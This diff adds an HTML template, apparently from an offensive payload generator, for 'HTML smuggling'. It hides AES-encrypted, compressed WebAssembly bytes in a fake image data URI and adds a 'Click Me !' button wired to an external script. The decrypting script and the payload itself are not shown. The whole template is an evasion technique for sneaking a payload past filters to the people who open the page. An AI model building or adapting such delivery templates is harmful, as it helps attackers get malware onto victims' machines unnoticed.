@@ -1,0 +1,13 @@
+<html>
+    <body>
+        <h1>{{o.signature}}</h1>
+        <h3>smuggle_html_aes_example</h3>
+        <img id="myImg" alt="" src="data:image/png;base64,{{b64(aes_encrypt(compress(o.wasmBytes), o.aesKey, o.aesIv))}}">
+        <button onclick="myFunction()">Click Me !</button>
+        <script src="{{o.name}}.js"></script>
+    </body>
+</html>
+
+
+
+
